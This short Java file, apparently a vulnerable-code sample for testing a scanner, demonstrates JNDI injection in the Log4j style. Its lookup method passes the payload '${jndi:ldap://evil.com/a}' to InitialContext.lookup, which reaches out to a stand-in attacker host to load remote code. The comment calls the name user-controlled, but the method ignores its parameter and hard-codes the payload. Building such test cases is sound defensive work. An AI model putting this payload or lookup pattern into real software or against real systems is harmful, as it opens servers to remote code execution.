// tp-jndi.java: JNDI injection via Log4j-style lookup
import javax.naming.*;

public class JndiLookup {
    public static Object lookup(String name) throws NamingException {
        Context ctx = new InitialContext();
        // VULNERABLE: user-controlled JNDI name
        return ctx.lookup("${jndi:ldap://evil.com/a}");
    }
}
